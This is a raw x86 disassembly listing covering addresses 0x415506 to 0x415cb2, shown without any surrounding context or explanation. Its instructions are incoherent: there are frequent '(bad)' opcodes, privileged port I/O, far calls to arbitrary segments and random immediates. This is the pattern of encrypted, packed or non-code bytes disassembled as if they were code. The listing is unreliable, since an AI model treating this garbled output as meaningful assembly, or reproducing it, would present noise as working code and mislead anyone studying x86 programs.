  415506:	push   0xac4820a0
  41550b:	imul   DWORD PTR [esi]
  41550d:	mov    WORD PTR [eax-0x4e],ss
  415510:	repnz repz in al,0x4e
  415514:	sub    bh,ah
  415516:	(bad)  
  415517:	out    dx,eax
  415518:	neg    DWORD PTR [ecx-0x4e]
  41551b:	pop    ebx
  41551c:	push   edx
  41551d:	pop    ds
  41551e:	mov    esi,0xe7affe39
  415523:	loope  0x41559f
  415525:	jg     0x41555a
  415527:	pusha  
  415528:	dec    ebx
  415529:	inc    esi
  41552a:	mov    ch,0x89
  41552c:	dec    ebx
  41552d:	pop    ebx
  41552e:	inc    edx
  41552f:	(bad)  
  415530:	push   esi
  415531:	lahf   
  415532:	or     eax,0x9f7349a4
  415537:	mov    edi,0x7f5acf39
  41553c:	out    dx,eax
  41553d:	or     al,BYTE PTR [ebx-0xf]
  415540:	sbb    eax,0xe9bf882e
  415545:	jp     0x415519
  415547:	cmp    al,0xc8
  415549:	fadd   DWORD PTR [ecx]
  41554b:	xlat   BYTE PTR ds:[ebx]
  41554c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41554d:	jno    0x41558d
  41554f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415550:	adc    al,0x3b
  415552:	pusha  
  415553:	scas   eax,DWORD PTR es:[edi]
  415554:	jno    0x4154fc
  415556:	inc    esp
  415557:	push   esp
  415558:	adc    eax,0x802b4d1e
  41555d:	mov    bl,ah
  41555f:	jmp    0x415515
  415561:	jp     0x4154e5
  415563:	adc    al,BYTE PTR [ebp+0x3c099620]
  415569:	cwde   
  41556a:	and    ch,BYTE PTR [eax+eax*2-0x108ac801]
  415571:	sbb    edi,DWORD PTR [ebp+0x13678a97]
  415577:	aaa    
  415578:	push   eax
  415579:	dec    ah
  41557b:	inc    DWORD PTR [ebp+esi*2-0x7676374e]
  415582:	cmp    BYTE PTR [ebx+0x71],0x42
  415586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415587:	and    eax,0xa28c56e
  41558c:	inc    esi
  41558d:	and    dh,BYTE PTR [eax]
  41558f:	push   ss
  415590:	push   ebp
  415591:	pushf  
  415592:	adc    edx,DWORD PTR [ecx+0x53]
  415595:	xchg   ecx,eax
  415596:	(bad)
  41559a:	cmp    eax,0xecd5fcc7
  41559f:	popa   
  4155a0:	fist   DWORD PTR [edx+0x15891bd2]
  4155a6:	fidivr DWORD PTR ds:0x3135387f
  4155ac:	stos   DWORD PTR es:[edi],eax
  4155ad:	fisttp WORD PTR [esp+edx*4-0x8]
  4155b1:	pop    ds
  4155b2:	pop    ebp
  4155b3:	cmp    al,0xab
  4155b5:	push   edx
  4155b6:	xchg   edx,eax
  4155b7:	jbe    0x41562d
  4155b9:	in     eax,0x81
  4155bb:	iret   
  4155bc:	pop    esp
  4155bd:	or     BYTE PTR [edx+ebp*2+0x4977bae6],ch
  4155c4:	inc    edx
  4155c5:	inc    ebx
  4155c6:	or     al,0x25
  4155c8:	popa   
  4155c9:	and    ebx,edx
  4155cb:	cdq    
  4155cc:	inc    ebx
  4155cd:	pop    ecx
  4155ce:	dec    esi
  4155cf:	jne    0x415573
  4155d1:	mov    al,0xf5
  4155d3:	(bad)  
  4155d4:	aam    0x33
  4155d6:	pop    ebx
  4155d7:	jne    0x41560f
  4155d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155da:	push   ebp
  4155db:	jg     0x41560a
  4155dd:	cld    
  4155de:	retf   0x89c7
  4155e1:	mov    ds:0x700b4e6e,al
  4155e6:	test   al,0x1d
  4155e8:	push   ecx
  4155e9:	pop    ds
  4155ea:	pop    edi
  4155eb:	aad    0x86
  4155ed:	pop    es
  4155ee:	mov    ebx,0x12bab4f6
  4155f3:	lahf   
  4155f4:	retf   
  4155f5:	sbb    esp,DWORD PTR [esi+0x1759cf69]
  4155fb:	popa   
  4155fc:	inc    ecx
  4155fd:	xlat   BYTE PTR ds:[ebx]
  4155fe:	sbb    eax,0x4d509ee2
  415603:	add    al,0x2f
  415605:	pushf  
  415606:	sbb    BYTE PTR [eax-0x2d241368],0xd8
  41560d:	sub    dl,al
  41560f:	add    DWORD PTR [eax],ebp
  415611:	or     cl,cl
  415613:	icebp  
  415614:	repz lea ebx,[esi]
  415617:	cmp    eax,0x869af4c7
  41561c:	iret   
  41561d:	js     0x41565d
  41561f:	xor    al,0xb3
  415621:	sbb    al,dl
  415623:	lods   al,BYTE PTR ds:[esi]
  415624:	out    dx,al
  415625:	xchg   eax,esp
  415627:	leave  
  415628:	xchg   ecx,eax
  415629:	out    dx,al
  41562a:	jbe    0x415695
  41562c:	(bad)  
  41562e:	inc    ebx
  41562f:	daa    
  415630:	and    al,0x8b
  415632:	mov    al,0x6c
  415634:	out    0x1d,al
  415636:	xor    dh,ah
  415638:	ds jnp 0x41564c
  41563b:	pop    ss
  41563c:	xchg   esp,eax
  41563d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41563e:	cmc    
  41563f:	mov    esp,0x3a792b5e
  415644:	rcl    DWORD PTR [esi],cl
  415646:	inc    ecx
  415647:	cwde   
  415648:	out    0x50,eax
  41564a:	clc    
  41564b:	and    DWORD PTR [ebp+esi*1-0x7a42766],edx
  415652:	lahf   
  415653:	imul   ebx,ecx,0xffffff9e
  415656:	xchg   BYTE PTR [ecx],dh
  415658:	lods   eax,DWORD PTR ds:[esi]
  415659:	fxch   st(6)
  41565b:	fistp  DWORD PTR [edx+0x6c]
  41565e:	push   edx
  41565f:	jl     0x4155eb
  415661:	mov    ebx,0x3c608d81
  415666:	pop    edi
  415667:	cmp    eax,0x2e5fcbd3
  41566c:	jp     0x415648
  41566e:	int3   
  41566f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415670:	fs xchg ebx,eax
  415672:	cmp    bh,BYTE PTR [ecx+0x2a]
  415675:	push   esp
  415676:	push   eax
  415677:	cmp    al,0xbd
  415679:	inc    ebp
  41567a:	cwde   
  41567b:	mov    DWORD PTR [eax-0x4b8acb17],edi
  415681:	ret    0x4f3e
  415684:	bound  ecx,QWORD PTR [ecx]
  415686:	neg    BYTE PTR [eax-0x64]
  415689:	fistp  DWORD PTR [eax+0x34]
  41568c:	imul   eax,eax,0x55
  41568f:	push   ecx
  415690:	cmp    al,0x60
  415692:	sahf   
  415693:	jmp    0x41562d
  415695:	pop    esi
  415696:	mov    bl,BYTE PTR [ebx-0x27]
  415699:	mov    cl,0x8a
  41569b:	sub    al,BYTE PTR [edx+0x54c16674]
  4156a1:	dec    ecx
  4156a2:	imul   esp,esi,0xffffffa2
  4156a5:	sbb    DWORD PTR [eax],esp
  4156a7:	popf   
  4156a8:	mov    esp,0xe41d61fd
  4156ad:	mov    edx,0xf8e4be38
  4156b2:	pop    edx
  4156b3:	xor    eax,0x6db9908d
  4156b8:	(bad)  
  4156b9:	mov    al,0xf8
  4156bb:	and    cl,BYTE PTR [edi-0x1d]
  4156be:	sbb    ebx,DWORD PTR [esi]
  4156c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c1:	cmp    esp,DWORD PTR [edx+0x21]
  4156c4:	push   ecx
  4156c5:	lods   al,BYTE PTR ds:[esi]
  4156c6:	inc    ecx
  4156c7:	fwait
  4156c8:	add    BYTE PTR [ebp+0x6c58d16e],ah
  4156ce:	mov    esi,0xb6bbe42c
  4156d3:	jg     0x41567b
  4156d5:	push   ebp
  4156d6:	lods   eax,DWORD PTR ds:[esi]
  4156d7:	mov    esi,0xd4015dc9
  4156dc:	push   ecx
  4156dd:	mov    cl,BYTE PTR [ecx+0x21]
  4156e0:	jl     0x415718
  4156e2:	xchg   edx,eax
  4156e3:	stos   DWORD PTR es:[edi],eax
  4156e4:	xchg   esp,eax
  4156e5:	jo     0x415755
  4156e7:	pop    esi
  4156e8:	push   edx
  4156e9:	sbb    ebx,DWORD PTR [ebp-0x3c]
  4156ec:	bnd jmp 0x14eada00
  4156f2:	mov    edx,0x187bb4b3
  4156f7:	out    0x21,al
  4156f9:	call   0xbc5e:0xf2f740f7
  415700:	dec    eax
  415701:	pop    ebp
  415702:	stc    
  415703:	cmp    bl,BYTE PTR [eax-0x18]
  415706:	pop    ecx
  415707:	adc    edx,edi
  415709:	jb     0x415777
  41570b:	leave  
  41570c:	jle    0x415751
  41570e:	fist   WORD PTR [edx+0x1]
  415711:	ror    DWORD PTR [ebx+0x1],cl
  415714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415715:	(bad)  [esi-0x5f]
  415718:	and    eax,0xd02e39c5
  41571d:	mov    esp,0x474afd6d
  415722:	xor    al,0x3
  415724:	cwde   
  415725:	mov    dl,0xb3
  415727:	inc    esp
  415728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415729:	dec    dx
  41572b:	call   0xae15ac30
  415730:	outs   dx,BYTE PTR ds:[esi]
  415731:	push   esp
  415732:	pop    ebx
  415733:	ret    0x2a69
  415736:	and    al,0xe2
  415738:	test   al,0xfd
  41573a:	rcr    DWORD PTR [eax-0x6a25664a],1
  415740:	aaa    
  415741:	xor    al,0x43
  415743:	rol    BYTE PTR [ebp-0x27cc87c5],1
  415749:	lock sbb BYTE PTR [edi-0x54a5aa2a],ah
  415750:	(bad)  [esp+edi*1]
  415753:	int    0x7
  415755:	aas    
  415756:	or     dh,BYTE PTR [ebx-0x17]
  415759:	call   0xecd5:0x1c11ff25
  415760:	jecxz  0x415749
  415762:	cmc    
  415763:	or     bh,BYTE PTR [edx]
  415765:	enter  0xaecd,0x30
  415769:	in     al,0xca
  41576b:	xor    eax,0x237b2dc7
  415770:	pop    ebx
  415771:	mov    dh,0x9c
  415773:	cwde   
  415774:	sub    eax,ecx
  415776:	adc    ah,0x33
  415779:	cmp    dl,BYTE PTR [eax]
  41577b:	push   edi
  41577c:	into   
  41577d:	cmc    
  41577e:	mov    ch,0xc1
  415780:	mov    bl,0xd3
  415782:	jp     0x41570f
  415784:	dec    edi
  415785:	inc    ebx
  415786:	dec    ebx
  415787:	rcr    BYTE PTR ds:0x4f856af7,0x90
  41578e:	and    bl,BYTE PTR [ecx+0x37]
  415791:	les    esp,FWORD PTR [eax]
  415793:	daa    
  415794:	aad    0xc6
  415796:	mov    cs,WORD PTR [eax+0x42]
  415799:	out    0xde,al
  41579b:	adc    al,0x4c
  41579d:	jecxz  0x415736
  41579f:	lods   eax,DWORD PTR ds:[esi]
  4157a0:	push   esp
  4157a1:	push   esp
  4157a2:	add    eax,0xc0249fab
  4157a7:	jns    0x4157a5
  4157a9:	add    ebx,DWORD PTR [esi+0x37]
  4157ac:	test   DWORD PTR [ecx-0x73],esi
  4157af:	ins    DWORD PTR es:[edi],dx
  4157b0:	in     al,dx
  4157b1:	inc    ecx
  4157b2:	aad    0xd2
  4157b4:	mov    dh,0xc
  4157b6:	aad    0x26
  4157b8:	mov    edi,0xf5ff9d28
  4157bd:	mov    ah,0x1
  4157bf:	test   DWORD PTR [esi+0x4f6566ab],esi
  4157c5:	imul   ebx,DWORD PTR [eax+0x6d865d3b],0x47bf2245
  4157cf:	ins    DWORD PTR es:[edi],dx
  4157d0:	mov    ecx,0xb3224188
  4157d5:	mov    DWORD PTR [edx-0x34],ebx
  4157d8:	jmp    0x41576d
  4157da:	mov    al,ds:0xedda7c1b
  4157df:	popf   
  4157e0:	cwde   
  4157e1:	and    BYTE PTR [esi+0x43],ah
  4157e4:	xor    DWORD PTR [edi],edi
  4157e6:	xchg   esi,eax
  4157e7:	outs   dx,BYTE PTR ds:[esi]
  4157e8:	jl     0x415786
  4157ea:	in     al,0xc6
  4157ec:	xor    DWORD PTR [ecx],ebp
  4157ee:	jb     0x4157b6
  4157f0:	mov    eax,ds:0xe3b60cd0
  4157f5:	and    esp,DWORD PTR [esi]
  4157f7:	push   ebp
  4157f8:	fwait
  4157f9:	sbb    bl,ah
  4157fb:	pop    ecx
  4157fc:	cmp    al,0x2f
  4157fe:	xchg   esi,eax
  4157ff:	push   0x1e316eef
  415804:	mov    ebx,0xe5b08f0b
  415809:	dec    edi
  41580a:	mov    bl,0x54
  41580c:	sbb    DWORD PTR [ebx],eax
  41580e:	xor    DWORD PTR [edi],edi
  415810:	adc    BYTE PTR [ecx-0x80],cl
  415813:	add    al,0x2e
  415815:	scas   al,BYTE PTR es:[edi]
  415816:	adc    al,0xc0
  415818:	ja     0x415853
  41581a:	call   0x44c0:0x8d7d49dd
  415821:	or     al,0x87
  415823:	jbe    0x4157d8
  415825:	push   esp
  415826:	xchg   DWORD PTR [edi-0x4cf05810],ebp
  41582c:	inc    edx
  41582d:	cwde   
  41582e:	lods   al,BYTE PTR ds:[esi]
  41582f:	test   DWORD PTR ds:0x1934288a,ecx
  415835:	add    DWORD PTR [edi+0x78],eax
  415838:	pop    edx
  415839:	xchg   BYTE PTR [ebx],ah
  41583b:	gs pop ebp
  41583d:	cwde   
  41583e:	sub    eax,0x582fb475
  415843:	frstor [ebp-0x48]
  415846:	add    DWORD PTR [ecx+0x35],esp
  415849:	xor    BYTE PTR [esi],bh
  41584b:	mov    ds:0x7dc2ca09,eax
  415850:	and    al,0x73
  415852:	fild   WORD PTR [esi]
  415854:	adc    eax,0x6afda11f
  415859:	daa    
  41585a:	call   0xbd46d793
  41585f:	sub    al,0x1b
  415861:	jne    0x4158c9
  415863:	out    dx,eax
  415864:	repz mov edi,DWORD PTR [ecx-0x7c509b31]
  41586b:	in     al,dx
  41586c:	into   
  41586d:	std    
  41586e:	pop    esi
  41586f:	or     al,0x35
  415871:	sub    DWORD PTR [ecx],0x2d
  415874:	outs   dx,DWORD PTR ds:[esi]
  415875:	or     ebx,ebx
  415877:	lds    ebx,FWORD PTR [ebx+0x74debf3d]
  41587d:	loopne 0x415893
  41587f:	sub    al,0xef
  415881:	push   0xffffff9d
  415883:	and    ebx,esp
  415885:	aaa    
  415886:	lods   eax,DWORD PTR ds:[esi]
  415887:	cmc    
  415888:	retf   
  415889:	cli    
  41588a:	sbb    edx,ebp
  41588c:	sbb    esi,DWORD PTR [ecx+0x4f]
  41588f:	aaa    
  415890:	push   ecx
  415891:	or     DWORD PTR [edx+0x4b99b30d],0x77260f82
  41589b:	sbb    eax,0x89c12b68
  4158a0:	loope  0x4158b9
  4158a2:	outs   dx,DWORD PTR ds:[esi]
  4158a3:	stos   DWORD PTR es:[edi],eax
  4158a4:	inc    esp
  4158a5:	cmp    esp,ebp
  4158a7:	mov    BYTE PTR [edx-0x3710fc53],cl
  4158ad:	lds    esi,FWORD PTR [esi-0xbed639]
  4158b3:	int3   
  4158b4:	sbb    BYTE PTR ds:0x6b4da810,al
  4158ba:	les    edx,FWORD PTR [eax-0x1babe69c]
  4158c0:	mov    ebp,0xd99c51ce
  4158c5:	leave  
  4158c6:	shl    BYTE PTR [edx+0x1eb849af],cl
  4158cc:	and    eax,0xf93ee38a
  4158d1:	push   eax
  4158d2:	xor    ch,BYTE PTR [ecx-0x374e301]
  4158d8:	xlat   BYTE PTR ds:[ebx]
  4158d9:	(bad)  cs:[ecx+0x57]
  4158dd:	int3   
  4158de:	mov    ch,0x5e
  4158e0:	dec    esp
  4158e1:	leave  
  4158e2:	or     BYTE PTR [eax],al
  4158e4:	or     DWORD PTR [esi-0x219c336d],eax
  4158ea:	sbb    eax,0x4776802e
  4158ef:	push   es
  4158f0:	dec    edx
  4158f1:	mov    ds:0x2933ac7d,eax
  4158f6:	and    dh,BYTE PTR [ebx-0x34]
  4158f9:	sub    esp,DWORD PTR [ebx]
  4158fb:	adc    DWORD PTR [edx-0x4caafb33],eax
  415901:	mov    ebp,0x90e7cb0
  415906:	out    dx,al
  415907:	pushf  
  415908:	xchg   edx,eax
  415909:	mov    DWORD PTR [edx+0x343c4770],ebx
  41590f:	cmp    BYTE PTR [ebx-0x39],bl
  415912:	mov    cl,0x58
  415914:	shl    BYTE PTR [esi+0x40],cl
  415917:	pop    edi
  415918:	les    edi,FWORD PTR [ebp+0x66477ce0]
  41591e:	push   edx
  41591f:	jae    0x415925
  415921:	jb     0x415938
  415923:	and    al,0x28
  415925:	mov    esi,0xf97442a4
  41592a:	dec    esp
  41592b:	xchg   edi,eax
  41592c:	fcom   DWORD PTR [ebp-0x35]
  41592f:	aad    0xf1
  415931:	push   cs
  415932:	pop    ss
  415933:	cmp    eax,0x66141fcc
  415938:	mov    ah,0x22
  41593a:	(bad)  
  41593b:	dec    ecx
  41593c:	sbb    ebp,DWORD PTR [eax-0x22]
  41593f:	push   0xffffff86
  415941:	pop    ecx
  415942:	ror    DWORD PTR [ebx+0x5ad54f63],0xb6
  415949:	out    dx,eax
  41594a:	mov    edi,DWORD PTR [esi]
  41594c:	(bad)  
  41594d:	and    BYTE PTR [esi],ch
  41594f:	(bad)  
  415950:	push   ebx
  415951:	and    DWORD PTR [ecx],0xffffffc3
  415954:	(bad)  
  415955:	xor    DWORD PTR [ebx],esi
  415957:	add    BYTE PTR [esp+esi*8],bl
  41595a:	out    0x8,eax
  41595c:	cmp    BYTE PTR [esi+ebx*4-0x2c785770],bh
  415963:	jns    0x415909
  415965:	pop    esp
  415966:	fldenv [eax-0x726a0dae]
  41596c:	push   0x979ea9d9
  415971:	push   ebp
  415972:	mov    cl,0xc7
  415974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415975:	ret    0x7671
  415978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415979:	mov    ds:0x4e1807dc,al
  41597e:	jmp    0x1f502fe4
  415983:	ja     0x4159e4
  415985:	pop    eax
  415986:	(bad)  
  415987:	std    
  415988:	sbb    BYTE PTR [ecx+0x4b147649],cl
  41598e:	dec    ebx
  41598f:	inc    edx
  415990:	(bad)  
  415992:	inc    esi
  415993:	xchg   ecx,eax
  415994:	jno    0x415936
  415996:	adc    eax,0x5c7d4001
  41599b:	out    dx,al
  41599c:	pop    ss
  41599d:	xor    eax,0xdba885b8
  4159a2:	mov    ch,bl
  4159a4:	jnp    0x4159be
  4159a6:	mov    bh,0x99
  4159a8:	xchg   ebp,eax
  4159a9:	sbb    eax,0xeb617aa8
  4159ae:	gs mov ah,0x48
  4159b1:	xchg   ecx,eax
  4159b2:	es out 0x60,al
  4159b5:	arpl   WORD PTR [edi-0x12],sp
  4159b8:	pop    esi
  4159b9:	in     eax,0xa4
  4159bb:	or     al,0xfa
  4159bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159be:	inc    ecx
  4159bf:	mov    esi,0xd5435da4
  4159c4:	add    BYTE PTR [ebx-0x67],0x98
  4159c8:	mov    ah,0x21
  4159ca:	rcl    BYTE PTR es:[ecx+esi*4-0x79],0xb0
  4159d0:	and    BYTE PTR [ebp-0x1d],0xcd
  4159d4:	jl     0x415a37
  4159d6:	and    DWORD PTR [ebp+0xbe45d88],ecx
  4159dc:	push   eax
  4159dd:	xchg   esi,eax
  4159de:	loopne 0x4159b1
  4159e0:	inc    esp
  4159e1:	idiv   DWORD PTR [edx+edx*1]
  4159e4:	scas   al,BYTE PTR es:[edi]
  4159e5:	add    DWORD PTR [edx],0x54
  4159e8:	or     ecx,ebx
  4159ea:	mov    dh,BYTE PTR [edi-0x45]
  4159ed:	cmp    edi,edi
  4159ef:	add    bh,ah
  4159f1:	jp     0x4159ce
  4159f3:	out    dx,al
  4159f4:	push   0xda18699b
  4159f9:	into   
  4159fa:	xor    ecx,DWORD PTR [esi+0x2f]
  4159fd:	adc    BYTE PTR ds:0x65fd810e,bl
  415a03:	enter  0xc2d5,0x48
  415a07:	loopne 0x415a00
  415a09:	arpl   WORD PTR [eax],dx
  415a0b:	and    esi,DWORD PTR [esi]
  415a0d:	mov    ecx,0x4d119e53
  415a12:	pop    edx
  415a13:	dec    edx
  415a14:	test   eax,0x98951728
  415a19:	mov    DWORD PTR [ebp-0x5f82e6b7],eax
  415a1f:	xor    al,ah
  415a21:	shl    BYTE PTR [edi],cl
  415a23:	xor    DWORD PTR [esi-0x5d1c2671],ebx
  415a29:	clc    
  415a2a:	mov    bl,0xa2
  415a2c:	push   0x59
  415a2e:	bound  ebx,QWORD PTR [ebx-0x1bd86339]
  415a34:	call   0xfe5046f4
  415a39:	nop
  415a3a:	lea    esp,[eax+0x76]
  415a3d:	mov    al,0xe4
  415a3f:	sti    
  415a40:	ins    BYTE PTR es:[edi],dx
  415a41:	call   DWORD PTR [ecx-0x2a]
  415a44:	or     BYTE PTR [edi+0x6f],bl
  415a47:	fistp  QWORD PTR [esi]
  415a49:	push   ss
  415a4a:	sub    eax,0x149d5fd9
  415a4f:	mov    dh,BYTE PTR [eax+0x71]
  415a52:	jle    0x4159fd
  415a54:	fs mov bh,0xe3
  415a57:	sti    
  415a58:	mov    ch,0x1b
  415a5a:	jne    0x415a3f
  415a5c:	mov    ds:0x9cb95d87,al
  415a61:	imul   esp,DWORD PTR [ebx-0x1cf282ac],0xa44a683
  415a6b:	imul   ebp,DWORD PTR [edx-0x3e],0xe4626470
  415a72:	pop    edx
  415a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a74:	sub    eax,0xa8435ad5
  415a79:	es pop esp
  415a7b:	jmp    0x7ad7ea33
  415a80:	(bad)  
  415a82:	mov    edx,0xff6e8a3b
  415a87:	loop   0x415a56
  415a89:	inc    ebx
  415a8a:	add    al,0x35
  415a8c:	push   cs
  415a8d:	out    0xb8,eax
  415a8f:	jmp    0x7604:0x94cc1675
  415a96:	dec    esi
  415a97:	pop    esi
  415a98:	test   ebp,0xcc354170
  415a9e:	dec    ebp
  415a9f:	pop    es
  415aa0:	ins    BYTE PTR es:[edi],dx
  415aa1:	pop    eax
  415aa2:	adc    al,0xa6
  415aa4:	or     al,BYTE PTR [esi+0x2f51dd20]
  415aaa:	call   esp
  415aac:	lock sbb esp,esp
  415aaf:	inc    ecx
  415ab0:	mov    WORD PTR [esi],?
  415ab2:	push   0xffffffb8
  415ab4:	repz test ecx,0x2f1cd54a
  415abb:	inc    esp
  415abc:	jecxz  0x415b0f
  415abe:	mov    esp,0x6148a3a5
  415ac3:	fcmovnu st,st(6)
  415ac5:	add    al,0xff
  415ac7:	in     al,dx
  415ac8:	pop    es
  415ac9:	add    esi,eax
  415acb:	sub    eax,0x5b6971e7
  415ad0:	inc    eax
  415ad1:	test   BYTE PTR [edi+0x159fdc1c],0xed
  415ad8:	bound  ebp,QWORD PTR [esi+0x399b59ae]
  415ade:	test   eax,0xcf9c0f3
  415ae3:	cli    
  415ae4:	mov    fs:0x2cd205c5,al
  415aea:	loopne 0x415ab2
  415aec:	pop    ss
  415aed:	pop    es
  415aee:	gs jo  0x415b67
  415af1:	cld    
  415af2:	in     al,0x68
  415af4:	push   ecx
  415af5:	adc    DWORD PTR [edi-0x1d13816a],edx
  415afb:	mov    edx,0x519bfca0
  415b00:	dec    esi
  415b01:	inc    ebx
  415b02:	fs in  eax,dx
  415b04:	mov    eax,ds:0x86c9f3ee
  415b09:	and    al,0x4c
  415b0b:	lahf   
  415b0c:	mov    ch,0x18
  415b0e:	xchg   edx,eax
  415b0f:	xchg   esp,eax
  415b10:	mov    cs,WORD PTR [ecx+0x62]
  415b13:	in     eax,0x45
  415b15:	ins    DWORD PTR es:[edi],dx
  415b16:	arpl   di,bx
  415b18:	xchg   ebx,eax
  415b19:	sbb    al,0x66
  415b1b:	mov    ss,ebp
  415b1d:	jg     0x415ac8
  415b1f:	xor    al,0xef
  415b21:	xchg   ebp,eax
  415b22:	das    
  415b23:	ins    BYTE PTR es:[edi],dx
  415b24:	xchg   esp,eax
  415b25:	jg     0x415b65
  415b27:	push   ebp
  415b28:	enter  0x97c6,0x90
  415b2c:	fdiv   DWORD PTR [esi+0x77]
  415b2f:	(bad)  
  415b30:	xchg   ebp,eax
  415b31:	mov    WORD PTR [ebx],fs
  415b33:	push   ss
  415b34:	lock jnp 0x415b74
  415b37:	dec    esp
  415b38:	aad    0x5e
  415b3a:	inc    esi
  415b3b:	jns    0x415b1a
  415b3d:	mov    cl,bl
  415b3f:	mov    edi,0x2acf22c6
  415b44:	push   ebp
  415b45:	jg     0x415b51
  415b47:	mov    dl,0x74
  415b49:	sbb    ebx,DWORD PTR [edi]
  415b4b:	popf   
  415b4c:	push   0xffffffec
  415b4e:	adc    dl,bl
  415b50:	mov    esp,0x4e19f456
  415b55:	xor    al,0x5a
  415b57:	out    dx,eax
  415b58:	call   0xb4be192a
  415b5d:	psubb  mm5,mm2
  415b60:	fsub   st,st(3)
  415b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b63:	jecxz  0x415b5d
  415b65:	mov    ds:0xf34f6e03,al
  415b6a:	call   0xdd5ebc0a
  415b6f:	dec    esp
  415b70:	lods   al,BYTE PTR ds:[esi]
  415b71:	add    bl,BYTE PTR [edx]
  415b73:	mov    ds:0x77cf57af,eax
  415b78:	adc    DWORD PTR [edi-0x4d5b1eaf],0xda45c9f3
  415b82:	mov    edi,0x3ab2d451
  415b87:	xchg   BYTE PTR ds:0xe356becd,al
  415b8d:	sub    bh,BYTE PTR [ebx-0x62cf809f]
  415b93:	or     bl,BYTE PTR [esi]
  415b95:	lea    esp,[bx+di+0x7576]
  415b9a:	mov    ch,0xc4
  415b9c:	or     bh,BYTE PTR [ecx+0x1]
  415b9f:	(bad)  
  415ba0:	fidivr DWORD PTR [edx+edi*2-0x17]
  415ba4:	sbb    eax,0xfd5fb65c
  415ba9:	int3   
  415baa:	cmp    BYTE PTR [ebx-0x4a],bh
  415bad:	mov    dh,0x9d
  415baf:	push   ebx
  415bb0:	inc    edx
  415bb1:	int    0xa6
  415bb3:	xchg   ebx,eax
  415bb4:	(bad)  
  415bb5:	int3   
  415bb6:	jne    0x415bab
  415bb8:	dec    edx
  415bb9:	lods   al,BYTE PTR ds:[esi]
  415bba:	jnp    0x415baa
  415bbc:	sbb    al,0xa0
  415bbe:	dec    eax
  415bbf:	pop    ecx
  415bc0:	push   ebx
  415bc1:	jmp    0x405df110
  415bc6:	cld    
  415bc7:	and    eax,0xc84ca997
  415bcc:	push   ebp
  415bcd:	iret   
  415bce:	cmc    
  415bcf:	ret    0xb398
  415bd2:	aas    
  415bd3:	or     DWORD PTR [ecx+edx*1],ebp
  415bd6:	jns    0x415c56
  415bd8:	push   0xffffffe3
  415bda:	and    cl,0xcc
  415bdd:	mov    dh,0x8f
  415bdf:	addr16 test dh,cl
  415be2:	inc    edi
  415be3:	and    ch,BYTE PTR [ecx-0x5b56137]
  415be9:	or     BYTE PTR ds:0x8ac36d1b,cl
  415bef:	xchg   ebp,eax
  415bf0:	lods   eax,DWORD PTR ds:[esi]
  415bf1:	or     ah,bh
  415bf3:	dec    edi
  415bf4:	sbb    ebx,ebp
  415bf6:	clc    
  415bf7:	pusha  
  415bf8:	cmp    al,0x8e
  415bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfb:	lahf   
  415bfc:	das    
  415bfd:	xchg   BYTE PTR [esi],ah
  415bff:	retf   
  415c00:	call   0xe393:0x4732f91
  415c07:	or     edx,DWORD PTR [eax+0x0]
  415c0a:	pop    ds
  415c0b:	inc    ebp
  415c0c:	fs gs jmp 0x1599a57d
  415c13:	jb     0x415b96
  415c15:	pop    edx
  415c16:	(bad)  
  415c17:	int3   
  415c18:	mov    edx,esp
  415c1a:	jo     0x415c7e
  415c1c:	loopne 0x415c93
  415c1e:	inc    esp
  415c1f:	(bad)  
  415c20:	cld    
  415c21:	jns    0x415c87
  415c23:	into   
  415c24:	pop    esi
  415c25:	(bad)  
  415c26:	xchg   esp,eax
  415c27:	int    0x1
  415c29:	aad    0x25
  415c2b:	xchg   esp,eax
  415c2c:	add    ecx,DWORD PTR [ebx]
  415c2e:	iret   
  415c2f:	aam    0x97
  415c31:	cdq    
  415c32:	mov    eax,0x58c1f5bf
  415c37:	push   esp
  415c38:	adc    esp,edx
  415c3a:	push   0xfffffffb
  415c3c:	push   ds
  415c3d:	in     al,dx
  415c3e:	ror    ecx,cl
  415c40:	cmp    dh,BYTE PTR [edx-0x1e]
  415c43:	cmp    eax,0x90a0e5ed
  415c48:	lods   al,BYTE PTR ds:[esi]
  415c49:	or     al,0x9a
  415c4b:	adc    DWORD PTR [edx+0x77],esp
  415c4e:	jge    0x415c44
  415c50:	mov    WORD PTR [ecx+0x7f],?
  415c53:	call   0x9b4f3a7e
  415c58:	mov    DWORD PTR [eax-0x124f74f3],esp
  415c5e:	mov    ebx,0x37feb33b
  415c63:	loop   0x415c64
  415c65:	xor    dh,BYTE PTR [esi]
  415c67:	scas   eax,DWORD PTR es:[edi]
  415c68:	in     eax,dx
  415c69:	sub    eax,0x666ab778
  415c6e:	das    
  415c6f:	test   DWORD PTR [edi],esp
  415c71:	xchg   ecx,eax
  415c72:	dec    eax
  415c73:	mov    esi,0x9746a9c5
  415c78:	cwde   
  415c79:	int    0x6f
  415c7b:	sbb    eax,0xbc5c6cb5
  415c80:	data16 xor al,0xfb
  415c83:	retf   0x34c9
  415c86:	jg     0x415d06
  415c88:	pop    es
  415c89:	mov    bh,0xcf
  415c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8c:	leave  
  415c8d:	adc    BYTE PTR [ebx],dl
  415c8f:	add    BYTE PTR [esi-0x223b7e25],al
  415c95:	jno    0x415ce9
  415c97:	pop    ecx
  415c98:	pop    ds
  415c99:	cli    
  415c9a:	retf   0x76c6
  415c9d:	add    ch,BYTE PTR [eax]
  415c9f:	mov    edi,0x68e084ca
  415ca4:	and    al,0xba
  415ca6:	jno    0x415c4e
  415ca8:	stc    
  415ca9:	mov    ebx,0x8eb569e2
  415cae:	jbe    0x415ceb
  415cb0:	out    0xc,eax
  415cb2:	iret   
